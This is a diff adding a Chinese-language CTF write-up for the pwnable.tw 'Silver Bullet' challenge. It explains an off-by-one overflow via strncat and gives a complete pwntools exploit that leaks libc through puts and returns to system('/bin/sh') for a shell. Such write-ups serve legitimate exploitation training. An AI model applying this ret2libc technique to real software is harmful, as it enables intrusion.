@@ -234,3 +234,41 @@ p.sendlineafter(": ",str(libc.sym['system']))
 p.sendlineafter(": ",str(libc.search(b'/bin/sh').__next__()))
 p.interactive()
 ```
+
+## Silver Bullet
+
+这类没有什么逆向成分的题做起来很舒服（再次点名calc）
+
+漏洞在power_up函数中：
+```c
+read_input(local_38,0x30 - *(int *)(param_1 + 0x30));
+strncat(param_1,local_38,0x30 - *(int *)(param_1 + 0x30));
+```
+有一个off by one，输入末尾的字符会溢出到`param_1 + 0x30`，覆盖长度属性。只要利用一次溢出将长度属性重置为1，后续`strncat`就会导致`param_1`溢出
+```py
+from pwn import *
+exe = ELF("./silver_bullet_patched")
+libc = ELF("./libc_32.so.6")
+context.binary = exe
+p=remote("chall.pwnable.tw", 10103)
+def powerup(desc):
+    p.sendlineafter(":",'2')
+    p.sendlineafter(":",desc)
+def create():
+    p.sendlineafter(":",'1')
+    p.sendlineafter(":",'a')
+def beat():
+    p.sendlineafter(":",'3')
+def trigger(rop):
+    create()
+    powerup("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
+    powerup("z")
+    powerup(rop)
+    beat()
+trigger(p32(0xffffffff)[:-1]+b'a'*4+p32(exe.plt['puts'])+p32(exe.sym['main'])+p32(exe.got['puts']))
+p.recvuntil("!!\n")
+libc.address=u32(p.recv(4))-0x5f140
+assert libc.address&0xfff==0 #不知道为什么本地会频繁出现泄漏地址失败的情况，反而是远程比较稳定
+trigger(p32(0xffffffff)[:-1]+b'a'*4+p32(libc.sym['system'])+p32(exe.sym['main'])+p32(libc.search(b'/bin/sh').__next__()))
+p.interactive()
+```
